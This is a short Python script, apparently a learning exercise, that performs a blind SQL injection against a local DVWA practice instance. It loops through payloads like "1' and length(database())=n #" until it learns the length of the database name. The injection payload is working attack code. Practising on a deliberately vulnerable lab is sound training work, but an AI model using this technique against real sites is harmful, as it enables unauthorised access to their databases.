import requests
from bs4 import BeautifulSoup as bs

#############################직접 입력해야하는 값들#############################

url ="http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/"

add_url = '?id=1&Submit=Submit&'

session = "PHPSESSID"
session_val = "sdoop6tab6tochvo3jvoakevsg"

cookies = {session: session_val,"security":"low"}

check_str ='User ID exists in the database.'

##############################################################################

def check_length():
    len = 0
    while True:
        len = len + 1
        payload = {
            "id": "1' and length(database())={} #".format(len),
            "Submit": "Submit"
                }
        res = requests.post(url, cookies=cookies, params=payload)
        soup = bs(res.text, "html.parser")
        pre_tag = soup.find('pre')
        if pre_tag is not None:
            if pre_tag.text == check_str:
                print(len)
                print('length is: ' + str(len))
                print('---------------------------------------------+')
                return len

check_length()
# Process the response


 